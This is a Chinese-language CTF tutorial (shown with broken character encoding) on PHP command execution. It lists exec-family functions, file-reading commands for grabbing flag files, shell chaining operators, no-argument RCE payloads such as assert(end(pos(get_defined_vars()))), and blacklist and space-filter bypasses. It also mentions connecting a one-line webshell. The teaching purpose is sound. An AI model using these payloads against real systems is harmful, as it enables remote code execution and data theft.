<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>&emsp;&emsp;è¿™ç±»çŸ¥è¯†ç‚¹ä¸»è¦é å¯¹å‡½æ•°å’Œå‘½ä»¤çš„ç†Ÿç»ƒåº¦å’Œæ‰©å±•åº¦ï¼Œèƒ½è¾¾æˆç›®çš„çš„æ–¹æ³•ä¸æ­¢ä¸€æ­¥ï¼Œè¦æŒæ¡å¸¸è§çš„å‡½æ•°å’Œæ–‡ä»¶è¯»å–çš„å‘½ä»¤ï¼ŒåŒæ—¶è¦å­¦ä¼šå¦‚ä½•åˆ©ç”¨ä¸€äº›ç‰¹æ€§å»ç»•è¿‡é»‘åå•ã€‚æ¨èå»Bç«™çœ‹æ©™å­ç§‘æŠ€çš„è§†é¢‘ï¼Œé‚£é‡Œä¸æ­¢æœ‰å‘½ä»¤æ‰§è¡Œçš„ï¼Œå¸Œæœ›å¯¹ä½ æœ‰å¸®åŠ©ã€‚</p>
<h3 id="å¸¸è§å‡½æ•°"><a href="#å¸¸è§å‡½æ•°" class="headerlink" title="å¸¸è§å‡½æ•°"></a>å¸¸è§å‡½æ•°</h3><h4 id="system"><a href="#system" class="headerlink" title="system"></a>system</h4><p>&emsp;&emsp;æœ€å¸¸ç”¨çš„ä¹Ÿæ˜¯æœ€å¥½ç”¨çš„å‡½æ•°ï¼Œé€šå¸¸èƒ½ç”¨systemäº†å°±ä»£è¡¨é‡Œæ‰¾åˆ°flagä¸è¿œäº†ï¼Œæœ€å¸¸è§„çš„ç”¨æ³•å°±æ˜¯<font color=blue>system(â€œlsâ€);</font>ç¡®è®¤ä¸€ä¸‹flagæ‰€åœ¨æ–‡ä»¶åï¼Œç„¶å<font color=blue>system(â€œcat flag.phpâ€);</font>æ³¨æ„ï¼šå¤§å¤šæ•°æƒ…å†µä¸‹åˆ†å·ä¹Ÿæ˜¯ä¸èƒ½å°‘çš„ï¼Œå› ä¸ºè¿™æ˜¯ä¸€æ¡è¯­å¥ã€‚<br>&emsp;&emsp;å½“ç„¶ä¹Ÿä¼šå‡ºç°æ‰¾ä¸åˆ°flagçš„ç°è±¡ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨<font color=red>system(â€œls &#x2F;â€œ);</font>å»æ ¹ç›®å½•æ‰¾ï¼Œä¹Ÿå¯ä»¥<font color=red>system(â€œenvâ€);</font>è°ƒç”¨ç¯å¢ƒå˜é‡å»æ‰¾ï¼Œæ³¨æ„ï¼šæœ‰çš„é¢˜ç›®flagæ‰€åœ¨çš„æ–‡ä»¶åä¸æ˜¯flag.phpï¼Œå»æ‰¾ç›¸ç±»ä¼¼çš„ï¼Œæˆ–è€…å¾ˆé•¿å¾ˆæ€ªçš„æ–‡ä»¶åå»è¯•ã€‚åœ¨ä¸æµï¼Œå°±ä½¿ç”¨ä¸€å¥è¯æœ¨é©¬è¿æ¥èšå‰‘å»ç¿»ï¼Œè¯¦æƒ…å»æœ¨é©¬é‚£ä¸€ç« å»çœ‹ã€‚</p>
<h4 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h4><p>&emsp;&emsp;execé€šå¸¸æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œexec($command,$output),ç¬¬ä¸€ä¸ªå‚æ•°è¾“å…¥è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œä½œä¸ºå•ç‹¬ä½¿ç”¨æ—¶åªæœ‰æœ€åä¸€è¡Œçš„ç»“æœï¼Œä¸”ä¸ä¼šå›æ˜¾ï¼›ç¬¬äºŒä¸ªå‚æ•°æ˜¯å°†å‘½ä»¤æ‰§è¡Œçš„è¾“å‡ºå¡«å……æ­¤æ•°ç»„ï¼Œé€è¡Œå¡«å……æ•°ç»„ï¼ˆäºŒç»´æ•°ç»„ï¼‰ï¼Œç”¨æ³•ï¼šä½¿ç”¨var_dumpæˆ– print_rè¾“å‡ºoutputé‡Œé¢çš„$å˜é‡ã€‚ ä¾‹å¦‚ï¼š<font color=blue>print_r($output);</font></p>
<h4 id="passthru"><a href="#passthru" class="headerlink" title="passthru"></a>passthru</h4><p>&emsp;&emsp;ä¸€ä¸ªå‚æ•°ï¼Œè¾“å…¥è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œä¼šè¾“å‡ºäºŒè¿›åˆ¶çš„æ•°æ®ï¼Œå¹¶ç›´æ¥å›æ˜¾ï¼Œä¸”å›æ˜¾çš„æ˜¯æ­£å¸¸æ•°æ®ï¼Œå’Œsystemä¸€æ ·å¥½ç”¨ï¼Œä¾‹å¦‚ï¼š<font color=blue>passthru(â€œlsâ€);</font></p>
<h4 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec"></a>shell_exec</h4><p>&emsp;&emsp;çœ‹åˆ°execå°±è¦æƒ³åˆ°è¿™æ˜¯ä¸å›æ˜¾çš„ï¼Œä½†æ˜¯åŒºåˆ«å°±æ˜¯å®ƒåªæœ‰ä¸€ä¸ªå‚æ•°,ç”¨ä¸€ä¸ªå˜é‡å»æ¥å®ƒï¼Œç„¶åä½¿ç”¨echoå’Œprintç­‰è¾“å‡ºç»“æœï¼Œä¾‹å¦‚ï¼š<font color=red>$output &#x3D; shell_exec(â€˜lsâ€™); echo $output;</font>  </p>
<h4 id="åå¼•å·"><a href="#åå¼•å·" class="headerlink" title="åå¼•å·` `"></a>åå¼•å·` `</h4><p>&emsp;&emsp;è¿™ä¸ªåŒshell_execä¸€æ ·ï¼Œä¹Ÿæ˜¯ç”¨echoå’Œprintè¾“å‡ºç»“æœï¼Œå®ƒéœ€è¦è·Ÿå•å¼•å·â€˜â€™åˆ†æ¸…æ¥šï¼Œåå¼•å·åœ¨æ•°å­—1çš„å·¦è¾¹é‚£ä¸ªæ‰æ˜¯ï¼Œå¼„é”™äº†è¾“å‡ºçš„ç»“æœè‚¯å®šä¹Ÿä¸ä¸€æ ·ã€‚å»ºè®®è‡ªå·±å»è¯•ä¸€ä¸‹ã€‚<br><img data-src="/images/%E5%8F%8D%E5%BC%95%E5%8F%B7.png" alt="åå¼•å·"> </p>
<h4 id="popen"><a href="#popen" class="headerlink" title="popen"></a>popen</h4><p>&emsp;&emsp;ä¸¤ä¸ªå‚æ•°popen($command,$mode),ç¬¬ä¸€ä¸ªå‚æ•°è¾“å…¥å‘½ä»¤ï¼Œç¬¬äºŒå‚æ•°ä¸ºæ¨¡å¼ï¼Œâ€™râ€™è¡¨ç¤ºé˜…è¯»ï¼Œâ€™wâ€™è¡¨ç¤ºå†™å…¥ã€‚åŒä¸Šé¢ä¸åŒçš„æ˜¯ï¼Œæœ‰ä¸ªopenï¼Œè¿™ä¸ªæœ‰å…³æ–‡ä»¶ï¼Œæ‰€ä»¥è¦å…ˆç”¨fgetsè¯»å–å†ç”¨print_rè¾“å‡ºï¼Œä¾‹å¦‚ï¼š  </p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">$a = <span class="keyword">popen</span>($command,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">while</span>($output=fgets($a))</span><br><span class="line">&#123;</span><br><span class="line">    print_r($output);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;fgetsåªè¯»å–ä¸€è¡Œï¼Œå› æ­¤éœ€è¦é å¾ªç¯éå†ã€‚è¿™ä¸ªä¸å¸¸é‡åˆ°ï¼Œå¯ä»¥å…ˆäº†è§£ä¸€ä¸‹ã€‚</p>
<h3 id="å¸¸è§æ–‡ä»¶è¯»å–å‘½ä»¤"><a href="#å¸¸è§æ–‡ä»¶è¯»å–å‘½ä»¤" class="headerlink" title="å¸¸è§æ–‡ä»¶è¯»å–å‘½ä»¤"></a>å¸¸è§æ–‡ä»¶è¯»å–å‘½ä»¤</h3><p>&emsp;&emsp;ä¸‹é¢çš„å‘½ä»¤å»ºè®®æ‰“å¼€ä½ çš„kaliæˆ–è€…linuxå»å®è·µä¸€ä¸‹ï¼Œå°è±¡æ›´æ·±æ›´æ˜ç™½ã€‚åœ¨webä¸‹ï¼Œè¦è·Ÿä¸Šé¢çš„å‡½æ•°æ­é…ä½¿ç”¨æ‰æ˜¯æ­£è§£ã€‚  </p>
<h4 id="lså’Œcat"><a href="#lså’Œcat" class="headerlink" title="lså’Œcat"></a>lså’Œcat</h4><p>&emsp;&emsp;æœ€å¸¸ç”¨çš„ä¸€ç»„å‘½ä»¤ï¼Œdddd  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> /</span><br><span class="line"><span class="built_in">cat</span> /flag</span><br></pre></td></tr></table></figure>

<h4 id="tac"><a href="#tac" class="headerlink" title="tac"></a>tac</h4><p>&emsp;&emsp;ä¸catåŠŸèƒ½ç±»ä¼¼ï¼Œåªä¸è¿‡æ˜¯åå‘æ˜¾ç¤ºï¼ˆä»è¡¨é¢ä¸Šçœ‹å°±çŸ¥é“ï¼Œå°±æ˜¯catçš„reverseï¼‰ã€‚ä¾‹å¦‚ï¼š<font color=bule>tac flag.txt</font></p>
<h4 id="moreå’Œless"><a href="#moreå’Œless" class="headerlink" title="moreå’Œless"></a>moreå’Œless</h4><p>&emsp;&emsp;more:ä¸€é¡µä¸€é¡µçš„è¾“å‡ºï¼Œç­‰åŒcatï¼ŒåŒºåˆ«è‡ªå·±å®è·µä¸€ä¸‹ã€‚<br>&emsp;&emsp;less: åŒä¸Šã€‚  </p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">more flag.php</span><br><span class="line"><span class="keyword">less</span> flag.php</span><br></pre></td></tr></table></figure>

<h4 id="tail"><a href="#tail" class="headerlink" title="tail"></a>tail</h4><p>&emsp;&emsp; æ˜¾ç¤ºæ–‡ä»¶çš„æœ€åå‡ è¡Œï¼ˆé»˜è®¤æ˜¾ç¤ºæœ€å10è¡Œï¼‰ï¼Œä¾‹å¦‚ï¼š<font color=red>tail flag.php</font>  </p>
<h4 id="nl"><a href="#nl" class="headerlink" title="nl"></a>nl</h4><p>&emsp;&emsp;æ˜¾ç¤ºçš„æ—¶å€™ï¼Œé¡ºä¾¿è¾“å‡ºè¡Œå·,ä¾‹å¦‚ï¼š<font color=blue>nl flag.php</font></p>
<h4 id="odå’Œxxd"><a href="#odå’Œxxd" class="headerlink" title="odå’Œxxd"></a>odå’Œxxd</h4><p>&emsp;&emsp;od:ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼è¯»å–æ¡£æ¡ˆå†…å®¹<br>&emsp;&emsp;xxd:è¯»å–äºŒè¿›åˆ¶æ–‡ä»¶,å¾ˆæ˜¾ç„¶ï¼Œæœ‰äºŒè¿›åˆ¶ï¼Œé€šå¸¸å’Œpassthruè¿›è¡Œæ­é…ä½¿ç”¨</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">cmd</span><span class="language-bash">=passthru(<span class="string">&quot;od -A d -c flag.php&quot;</span>);</span></span><br><span class="line">?<span class="keyword">cmd</span><span class="language-bash">=passthru(<span class="string">&quot;xxd flag.php&quot;</span>);</span></span><br></pre></td></tr></table></figure>
<p><img data-src="/images/xxd.png" alt="xxd"></p>
<h4 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h4><p>&emsp;&emsp;ä¸»è¦ç”¨äºæ’åºæ–‡ä»¶ï¼Œä½†ä¹Ÿèƒ½è¾¾æˆç›®çš„ï¼Œä¾‹å¦‚:<font color=red>sort flag.txt</font></p>
<h4 id="uniq-file-f-grep"><a href="#uniq-file-f-grep" class="headerlink" title="uniq | file -f | grep"></a>uniq | file -f | grep</h4><p>&emsp;&emsp;uniq:æŠ¥å‘Šæˆ–åˆ é™¤æ–‡ä»¶ä¸­é‡å¤çš„è¡Œ<br>&emsp;&emsp;file -f:æŠ¥é”™å‡ºå…·ä½“å†…å®¹<br>&emsp;&emsp;grep:åœ¨æ–‡æœ¬ä¸­æŸ¥æ‰¾æŒ‡å®šçš„å­—ç¬¦ä¸²<br><img data-src="/images/grep.png" alt="grep"></p>
<h3 id="æ“ä½œç³»ç»Ÿé“¾æ¥ç¬¦"><a href="#æ“ä½œç³»ç»Ÿé“¾æ¥ç¬¦" class="headerlink" title="æ“ä½œç³»ç»Ÿé“¾æ¥ç¬¦"></a>æ“ä½œç³»ç»Ÿé“¾æ¥ç¬¦</h3><h4 id=""><a href="#" class="headerlink" title=";"></a>;</h4><p>&emsp;&emsp;è¿™ä¸ªåº”è¯¥éƒ½çŸ¥é“ï¼Œä»£è¡¨è¿™æ¡è¯­å¥çš„ç»“æŸï¼Œåé¢å¯ä»¥ç»§ç»­è·Ÿå‘½ä»¤ï¼Œå¯ä»¥ä½¿å¤šä¸ªå‘½ä»¤æŒ‰é¡ºåºæ‰§è¡Œï¼Œè‡ªè¡Œå»kaliè¯•ä¸€ä¸‹ï¼Œå¦‚æœphpä¸­é‡åˆ°è¿‡æ»¤ï¼Œå¯ä»¥ç”¨?&gt;ä»£æ›¿ï¼Œå®ƒä»£è¡¨ç€ä»£ç çš„ç»“æŸã€‚ä¾‹å¦‚<font color=red>id;ls;pwd</font></p>
<h4 id="-1"><a href="#-1" class="headerlink" title="&amp;"></a>&amp;</h4><p>&emsp;&emsp;ä¸€æ ·çš„æ•ˆæœï¼Œä½¿å‘½ä»¤åœ¨åå°è¿è¡Œï¼Œè¿™æ ·å°±å¯ä»¥åŒæ—¶æ‰§è¡Œå¤šæ¡å‘½ä»¤ï¼Œæ³¨æ„åœ¨GETä¼ å‚çš„æ—¶å€™<code>å¿…é¡»URLç¼–ç </code>,&amp;çš„URLä¸º%26ã€‚ä¾‹å¦‚<font color=blue>?c&#x3D;ls%26cat flag.php</font></p>
<h4 id="-2"><a href="#-2" class="headerlink" title="&amp;&amp;"></a>&amp;&amp;</h4><p>&emsp;&emsp;å’Œé€»è¾‘ä¸çš„è¯­æ³•ä¸€æ ·ï¼Œä¸¤è¾¹ä¸ºå‘½ä»¤çš„æ—¶å€™ï¼Œå‰é¢çš„å‘½ä»¤æ‰§è¡ŒæˆåŠŸæ‰ä¼šæ‰§è¡Œåé¢çš„å‘½ä»¤ï¼Œåä¹‹åˆ™ä¸ä¼šæ‰§è¡Œåé¢çš„å‘½ä»¤ï¼ŒåŒä¸Šï¼Œ<code>å¿…é¡»URLç¼–ç </code>,ä¾‹å¦‚<font color=red>?c&#x3D;ls%26%26cat flag.php</font></p>
<h4 id="-3"><a href="#-3" class="headerlink" title="|"></a>|</h4><p>&emsp;&emsp;å°†å‰é¢å‘½ä»¤çš„è¾“å‡ºä½œä¸ºåé¢å‘½ä»¤çš„è¾“å…¥ï¼ŒæŠŠå‰é¢å‘½ä»¤çš„ç»“æœå½“æˆåé¢å‘½ä»¤çš„å‚æ•°ï¼›æ˜¯ä¸æ˜¯çœ‹èµ·æ¥æœ‰ç‚¹ç”Ÿæ¶©ï¼Ÿæ²¡å…³ç³»ï¼Œçœ‹ä¸ªä¾‹é¢˜å°±æ˜ç™½äº†ã€‚<br>&emsp;&emsp;<font color=blue>echo â€œls -lâ€</font>è¿™ä¸ªæ˜¯åªæ˜¾ç¤ºâ€ls -lâ€,è€Œä¸æ˜¯å‘½ä»¤ã€‚<br>&emsp;&emsp;<font color=red>echo â€œls -lâ€ | &#x2F;bin&#x2F;bash</font>è¿™ä¸ªæ˜¯&#x2F;bin&#x2F;bashæŠŠâ€ls -lâ€å½“æˆå‚æ•°æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯æ‰§è¡Œäº†ls -lè¿™æ¡å‘½ä»¤ã€‚  </p>
<h4 id="-4"><a href="#-4" class="headerlink" title="||"></a>||</h4><p>&emsp;&emsp;ç»§æ‰¿äº†é€»è¾‘æˆ–çš„è¯­æ³•ï¼Œè¿˜æœ‰çŸ­è·¯åŸåˆ™ï¼Œæ¢ä¸ªæ›´å®¹æ˜“ç†è§£çš„å°±æ˜¯ç›¸å½“äºif elseè¯­å¥ï¼Œè‹¥å‰é¢çš„å‘½ä»¤æ‰§è¡ŒæˆåŠŸï¼Œåé¢çš„å‘½ä»¤å°±ä¸ä¼šæ‰§è¡Œï¼Œåä¹‹æ‰§è¡Œåé¢çš„å‘½ä»¤ï¼›ä¾‹å¦‚<br>&emsp;&emsp;<font color=blue>ls || &gt;dev&#x2F;null 2&gt;&amp;1</font>åè€…ç›¸å½“äºä¸€ä¸ªåƒåœ¾æ¡¶ï¼Œä½ çš„æ‰€æœ‰è¾“å‡ºéƒ½ä¼šè¢«ä¸¢è¿›å»,â€&gt;â€ä»£è¡¨çš„æ˜¯é‡å®šå‘ï¼Œè¿˜æœ‰2å’Œ1å…·ä½“ä»£è¡¨ä»€ä¹ˆæ„Ÿå…´è¶£çš„å¯ä»¥å†å»çœ‹ä¸€ä¸‹ï¼Œç›®å‰åªè¦çŸ¥é“è¿™æ ·çš„æ ¼å¼ä»£è¡¨çš„æ˜¯åƒåœ¾æ¡¶å°±å¥½ã€‚å¥½ï¼Œå›å½’æ­£é¢˜ï¼Œå¦‚æœæ²¡æœ‰||ï¼Œä½œä¸ºé¡ºåºè¾“å‡ºçš„è¯ï¼Œå°±ä¸ä¼šæœ‰å›æ˜¾ï¼›åä¹‹ï¼Œlsæ­£å¸¸è¾“å‡ºï¼Œåé¢å°±ä¸ä¼šæ‰§è¡Œäº†ã€‚</p>
<h4 id="æ— å‚æ•°å‘½ä»¤æ‰§è¡Œ"><a href="#æ— å‚æ•°å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="æ— å‚æ•°å‘½ä»¤æ‰§è¡Œ"></a>æ— å‚æ•°å‘½ä»¤æ‰§è¡Œ</h4><p>&emsp;&emsp;é€šä¿—æ¥è¯´å°±æ˜¯å‡½æ•°é‡Œé¢æ²¡æœ‰æœ‰å‚æ•°ï¼Œæ¯”å¦‚phpinfo()æ˜¯ä¸æ˜¯ï¼Œé‡Œé¢æ²¡æœ‰å‚æ•°ç…§æ ·èƒ½ç”¨ï¼Œé‚£ä¹ˆä¸€äº›èƒ½åˆ©ç”¨çš„å‡½æ•°æœ‰å“ªäº›å‘¢ï¼Ÿï¼Ÿï¼Ÿ</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="built_in">eval</span>($_GET[<span class="string">&#x27;code&#x27;</span>])<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;åƒæ˜¯æ­£åˆ™é‡Œé¢çš„é‚£ä¸¤ä¸ªå°±ä»£è¡¨è¿‡æ»¤äº†å‚æ•°ï¼Œå°±åªèƒ½ä½¿ç”¨æ— å‚äº†ã€‚</p>
<h5 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h5><p>&emsp;&emsp;è¿”å›æ‰€æœ‰å·²å®šä¹‰çš„<font color=yellow>å˜é‡çš„å€¼</font>,ç„¶åå¯¹åº”æˆæ•°ç»„ï¼ˆæ³¨ï¼šå¦‚æœæœ‰å¤šä¸ªè¯·æ±‚æ–¹æ³•ï¼Œè¿”å›æ•°ç»„çš„é¡ºåºä¸ºGET-&gt;POST-&gt;COOKIE-&gt;FILESï¼‰ï¼Œä¾‹å¦‚ï¼šå®šä¹‰äº†<font color=pink>cmd&#x3D;system(â€œlsâ€);</font>é‚£ä¹ˆæ‰§è¡Œ<font color=black>print_r(get_defined_vars());</font>æ—¶ï¼Œå°†ä¼šå›æ˜¾<font color=red>[cmd]&#x3D;&gt;system(â€œls);</font>è¿™æ˜¯æˆ‘ä»¬å°±å¯ä»¥ç”¨<font color=green>posæ¥æå–å‡ºå‚æ•°é‡Œé¢çš„å€¼system(â€œlsâ€)</font>,ä»€ä¹ˆï¼Œä½ è¯´æ²¡æœ‰å˜é‡æ€ä¹ˆåŠï¼Ÿç¬¨è›‹ï¼Œä¸çŸ¥é“è‡ªå·±ç¼–ä¸€ä¸ªå—ï¼Ÿæˆ‘ä»¬å¯ä»¥è¿™æ ·</p>
<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">?code=print_r(<span class="keyword">end</span>(pos(get_defined_vars())));<span class="variable">&amp;cmd</span>=<span class="meta">system</span>(<span class="string">&quot;ls&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;æ³¨æ„åªè¦åé¢çš„é‚£ä¸ªå˜é‡ï¼Œç”¨endæå–(åˆ«é—®ï¼Œé—®å°±æ˜¯codeæˆ‘ä»¬ä¹Ÿç®—å˜é‡å•µï¼Œå®šä¹‰äº†ä¸¤ä¸ªå˜é‡å°±æœ‰ä¸¤ä¸ªæ•°ç»„ï¼Œæˆ‘ä»¬ç”¨åé¢é‚£ä¸ªcmdçš„)ï¼Œè¿™æ ·å°±å¯ä»¥è¾“å‡ºsystem(â€œlsâ€);åŒç†ï¼Œæˆ‘ä»¬åªè¦æŠŠprint_ræ¢æˆeval,assertå°±å¯ä»¥æ‰§è¡Œå‘½ä»¤äº†ï¼Œæ‰€ä»¥payloadé€šå¸¸æ˜¯:</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">?code=<span class="keyword">assert</span>(<span class="keyword">end</span>(pos(get_defined_vars())));&amp;cmd=<span class="keyword">system</span>(&quot;ls&quot;);</span><br></pre></td></tr></table></figure>

<h5 id="å¤§æ‚çƒ©"><a href="#å¤§æ‚çƒ©" class="headerlink" title="å¤§æ‚çƒ©"></a>å¤§æ‚çƒ©</h5><p>&emsp;&emsp;ä¸è§£é‡Šäº†ï¼Œçœ‹å›¾<br><img data-src="/images/%E5%A4%A7%E6%9D%82%E7%83%A9.png" alt="scandir"><br>&emsp;&emsp;ç”¨æ³•ï¼š</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">localeconv</span>()); <span class="comment">//æŸ¥çœ‹å½“å‰ç›®å½•æ–‡ä»¶åï¼Œå½¢å¼åŒget_defined_varsçš„æ’åˆ—ä¸€æ ·</span></span></span><br><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">current</span>(<span class="title">localeconv</span>())); <span class="comment">// åŒposï¼Œè¯»å–ç¬¬ä¸€ä¸ªæ•°ç»„çš„å€¼</span></span></span><br><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">scandir</span>(<span class="title">current</span>(<span class="title">localeconv</span>()))); <span class="comment">//è¯»å–å½“å‰ç›®å½•ï¼ˆç¬¬ä¸€ä¸ªæ•°ç»„æ‰€åœ¨ç›®å½•ï¼‰ä¸‹çš„æ–‡ä»¶å</span></span></span><br><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">aray_reverse</span>(<span class="title">scandir</span>(<span class="title">current</span>(<span class="title">localeconv</span>())))); <span class="comment">//åŒ<span class="doctag">end</span>çš„ä½œç”¨ï¼Œå¦‚æœflagåœ¨æœ€åä¸€ä¸ªï¼Œå€’è½¬ä½¿å®ƒå˜æˆç¬¬ä¸€ä¸ªï¼Œå†ç”¨currentå¯¹å‘å®ƒï¼Œshow_sourceè¿›è¡Œå›æ˜¾</span></span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;é‚£ä¹ˆæœ€ç»ˆçš„payloadå°±ä¸ºï¼š</p>
<figure class="highlight nsis"><table><tr><td class="code"><pre><span class="line">?code=show_source(<span class="literal">current</span>((aray_reverse(scandir(<span class="literal">current</span>(localeconv()))))))<span class="comment">;</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;åŒç†ï¼Œgetcwd()ä¹Ÿå¯ä»¥è¾¾æˆç›®çš„ï¼Œé‚£ä¹ˆå¦ä¸€ç§çš„payloadå°±ä¸ºï¼š</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">?<span class="meta">code</span><span class="symbol">=show_source</span>(<span class="meta">end</span>(scandir(getcwd())))<span class="comment">;</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;å¯¹ç…§ä¸Šé¢çš„å‡½æ•°ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ç”¨è¯»å–ä¸Šä¸€çº§ç›®å½•çš„éšæœºæ–‡ä»¶å(ç›´åˆ°éšæœºåˆ°flagå³å¯)ï¼Œpayloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?code=show_source(array_rand(array_flip(scandir(<span class="built_in">dirname</span>(<span class="built_in">chdir</span>(<span class="built_in">dirname</span>(getcwd())))))));</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;payloadä¸æ˜¯ä¸€æˆä¸å˜çš„ï¼Œæ ¹æ®é¢˜ç›®ä½¿ç”¨å®ç”¨çš„å‡½æ•°ï¼Œçœ‹ä½ çš„ç†Ÿç»ƒåº¦å¦‚ä½•äº†ã€‚<br>&emsp;&emsp;æ¨èåšå®¢ï¼š<a href="https://blog.csdn.net/2301_76690905/article/details/133808536">æ— å‚RCE</a><br>&emsp;&emsp;æ¨èè§†é¢‘: <a href="https://www.bilibili.com/video/BV1tG4y1c7Vb/?spm_id_from=333.999.0.0&vd_source=fb821c5d64cc54f5e03e8f0c7ecb5672">æ©™å­ç§‘æŠ€</a></p>
<h5 id="session-start"><a href="#session-start" class="headerlink" title="session_start()"></a>session_start()</h5><p>&emsp;&emsp;è¿™ä¸ªéš¾åº¦ç³»æ•°æœ‰ç‚¹é«˜ï¼Œå¯ä»¥è‡ªå·±å»çœ‹è§†é¢‘å®è·µä¸€ä¸‹ï¼Œå¹³å¸¸æƒ…å†µä¸æ¨èä½¿ç”¨ï¼Œå¤±è¯¯ç‡ä¹Ÿè›®å¤§çš„ã€‚</p>
<h3 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h3><h4 id="æ›¿æ¢å‡½æ•°ç»•è¿‡"><a href="#æ›¿æ¢å‡½æ•°ç»•è¿‡" class="headerlink" title="æ›¿æ¢å‡½æ•°ç»•è¿‡"></a>æ›¿æ¢å‡½æ•°ç»•è¿‡</h4><p>&emsp;&emsp;ä¹‹æ‰€ä»¥ä»‹ç»è¿™ä¹ˆå¤šå¸¸è§çš„å‘½ä»¤å’Œå‡½æ•°å°±æ˜¯ä¸ºäº†è¾¾æˆè¿™ä¸ªç›®çš„ï¼Œçœ‹é»‘åå•å†…æ²¡æœ‰å…¶ä¸­çš„å“ªäº›ï¼ˆä¸ªï¼‰å‡½æ•°å’Œå‘½ä»¤å°±å¯ä»¥ç”¨å®ƒå®ç°ä¸€æ ·çš„æ•ˆæœã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/exec/system/popen/proc_open|\`/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))</span><br><span class="line">   <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;å¾ˆæ˜æ˜¾ï¼Œå¯¹ç…§ä¸Šé¢çš„å‡½æ•°ï¼Œè¿˜æœ‰passthruæ²¡æœ‰è¿‡æ»¤ï¼Œå°±å¯ä»¥ä½¿ç”¨è¯¥å‡½æ•°ï¼Œ<font color=blue>?c&#x3D;passthru(â€œlsâ€);</font></p>
<h4 id="ç©ºæ ¼è¿‡æ»¤ç»•è¿‡"><a href="#ç©ºæ ¼è¿‡æ»¤ç»•è¿‡" class="headerlink" title="ç©ºæ ¼è¿‡æ»¤ç»•è¿‡"></a>ç©ºæ ¼è¿‡æ»¤ç»•è¿‡</h4><p>&emsp;&emsp;ç©ºæ ¼è¿‡æ»¤æ˜¯å±äºæ¯”è¾ƒçƒ¦çš„ä¸€ç§ï¼Œå°¤å…¶åœ¨SQLæ³¨å…¥ä¸­â”»â”»ï¸µâ&#x3D;à¼àº¶ï¹à¼àº¶&#x3D;âï¸µâ”»â”»ï¼Œç®—äº†ï¼Œæˆ‘ä»¬å…ˆçœ‹è¿™é‡Œçš„ã€‚</p>
<h5 id="å¤§æ‹¬å·"><a href="#å¤§æ‹¬å·" class="headerlink" title="å¤§æ‹¬å·{}"></a>å¤§æ‹¬å·{}</h5><p>&emsp;&emsp;é¡¾åæ€ä¹‰å°±æ˜¯ç”¨å¤§æ‹¬å·å°†å‘½ä»¤æ‹¬èµ·æ¥ï¼Œä¸­é—´ç”¨ï¼Œåˆ†å‰²ï¼Œä¾‹å¦‚<font color=red>{cat,flag.txt};</font>  </p>
